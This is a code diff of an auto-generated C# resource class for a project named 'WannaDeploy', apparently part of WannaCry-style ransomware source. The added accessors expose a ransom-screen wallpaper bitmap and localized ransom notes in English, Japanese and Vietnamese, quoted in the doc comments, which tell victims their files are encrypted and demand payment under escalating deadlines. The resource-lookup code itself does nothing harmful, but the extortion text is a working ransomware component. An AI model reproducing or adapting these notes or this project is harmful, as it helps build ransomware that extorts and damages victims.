@@ -8,10 +8,10 @@
 // </auto-generated>
 //------------------------------------------------------------------------------
 
-namespace WannaDeploy.Properties
-{
-
-
+namespace WannaDeploy.Properties {
+    using System;
+    
+    
     /// <summary>
     ///   A strongly-typed resource class, for looking up localized strings, etc.
     /// </summary>
@@ -19,52 +19,106 @@ namespace WannaDeploy.Properties
     // class via a tool like ResGen or Visual Studio.
     // To add or remove a member, edit your .ResX file then rerun ResGen
     // with the /str option, or rebuild your VS project.
-    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
+    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "15.0.0.0")]
     [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
     [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
-    internal class Resources
-    {
-
+    internal class Resources {
+        
         private static global::System.Resources.ResourceManager resourceMan;
-
+        
         private static global::System.Globalization.CultureInfo resourceCulture;
-
+        
         [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
-        internal Resources()
-        {
+        internal Resources() {
         }
-
+        
         /// <summary>
         ///   Returns the cached ResourceManager instance used by this class.
         /// </summary>
         [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
-        internal static global::System.Resources.ResourceManager ResourceManager
-        {
-            get
-            {
-                if ((resourceMan == null))
-                {
+        internal static global::System.Resources.ResourceManager ResourceManager {
+            get {
+                if (object.ReferenceEquals(resourceMan, null)) {
                     global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("WannaDeploy.Properties.Resources", typeof(Resources).Assembly);
                     resourceMan = temp;
                 }
                 return resourceMan;
             }
         }
-
+        
         /// <summary>
         ///   Overrides the current thread's CurrentUICulture property for all
         ///   resource lookups using this strongly typed resource class.
         /// </summary>
         [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
-        internal static global::System.Globalization.CultureInfo Culture
-        {
-            get
-            {
+        internal static global::System.Globalization.CultureInfo Culture {
+            get {
                 return resourceCulture;
             }
-            set
-            {
+            set {
                 resourceCulture = value;
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to What Happen to My Computer?
+        ///Your important files are encrypted
+        ///Many of your documents, photos, videos, databases and other files are no longer accessible because they have been encrypted. Maybe you are looking for a way to recover your files, but do not waste your time. Nobody can recover your files without our decryption service
+        ///
+        ///Can I Recover My Files?
+        ///Sure, We can guarantee that you can recover all your files safely and easily. But you have not so much time.
+        ///You can decrypt some of yours files for  [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string EN {
+            get {
+                return ResourceManager.GetString("EN", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to 私のコンピュータはどうなりますか？
+        ///重要なファイルは暗号化されています
+        ///文書、写真、ビデオ、データベース、およびその他のファイルの多くは、暗号化されているためアクセスできなくなりました。ファイルを回復する方法を探しているかもしれませんが、時間を無駄にすることはありません。誰も私たちの解読サービスなしであなたのファイルを回復することはできません
+        ///
+        ///ファイルを回復できますか？
+        ///確かに、すべてのファイルを安全かつ簡単に復元できることを保証できます。しかし、あなたはあまり時間がありません。
+        ///いくつかのファイルを無料で解読することができます。 &lt;decrypt&gt;をクリックして、
+        ///しかし、すべてのファイルを復号化したい場合は、支払う必要があります。
+        ///お支払いを送信するのに3日しかかかりません。その後、価格は2倍になります。
+        ///また、7日以内に支払いをしないと、ファイルを永久に回復することができなくなります。
+        ///6か月以内に払うことができないほど貧しいユーザーに対しては、無料イベントを開催します。
+        ///
+        ///どのように支払うのですか？
+        ///送信ボタンをクリックし、最初のフィールドにメールアドレスを入力します。
+        /// [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string JP {
+            get {
+                return ResourceManager.GetString("JP", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to Điều gì đã xảy ra với máy tính của tôi?
+        ///Các tệp tin quan trọng của bạn được mã hóa
+        ///Nhiều tài liệu, ảnh, video, cơ sở dữ liệu và các tệp khác của bạn không thể truy cập được vì chúng đã được mã hóa. Có thể bạn đang tìm kiếm một cách để khôi phục các tệp của mình, nhưng đừng phí thời gian. Không ai có thể phục hồi các tệp của bạn mà không có dịch vụ giải mã của chúng tôi
+        ///
+        ///Tôi có thể Khôi phục các tệp của tôi?
+        ///Chắc chắn, Chúng tôi có thể đảm bảo rằng bạn có thể khôi phục lại tất cả các tệp tin một cách an [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string VI {
+            get {
+                return ResourceManager.GetString("VI", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized resource of type System.Drawing.Bitmap.
+        /// </summary>
+        internal static System.Drawing.Bitmap WallPaper {
+            get {
+                object obj = ResourceManager.GetObject("WallPaper", resourceCulture);
+                return ((System.Drawing.Bitmap)(obj));
             }
         }
     }
